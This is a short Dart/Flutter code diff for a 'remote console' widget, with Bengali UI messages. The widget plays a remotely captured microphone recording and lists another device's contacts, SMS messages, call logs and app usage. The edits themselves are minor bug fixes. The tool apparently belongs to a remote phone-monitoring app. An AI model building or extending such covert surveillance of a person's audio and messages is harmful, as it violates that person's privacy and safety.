@@ -166,7 +166,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
           try {
             final f = File('${Directory.systemTemp.path}/remote_mic.m4a');
             await f.writeAsBytes(base64Decode(b64));
-            await _gChannel.invokeMethod('playFile', f.absolutePath);
+            await _gChannel.invokeMethod('playFile', f.path);
             _snack('অডিও চলছে 🔊');
           } catch (_) {
             _snack('অডিও চালানো যায়নি');
@@ -220,7 +220,7 @@ class _RemoteConsoleCardState extends State<RemoteConsoleCard> {
         String t1 = '', t2 = '';
         if (type == 'contacts') { t1 = m['name']?.toString() ?? ''; t2 = m['num']?.toString() ?? ''; }
         if (type == 'sms') { t1 = m['addr']?.toString() ?? ''; t2 = m['body']?.toString() ?? ''; }
-        if (type == 'calls') { t1 = m['name']?.toString()?.isNotEmpty == true ? m['name'].toString() : (m['num']?.toString() ?? ''); t2 = m['num']?.toString() ?? ''; }
+        if (type == 'calls') { t1 = (m['name']?.toString() ?? '').isNotEmpty ? m['name'].toString() : (m['num']?.toString() ?? ''); t2 = m['num']?.toString() ?? ''; }
         if (type == 'apps') { t1 = m['pkg']?.toString() ?? ''; t2 = DateTime.fromMillisecondsSinceEpoch((m['last'] as num?)?.toInt() ?? 0).toString(); }
         return ListTile(
           dense: true,
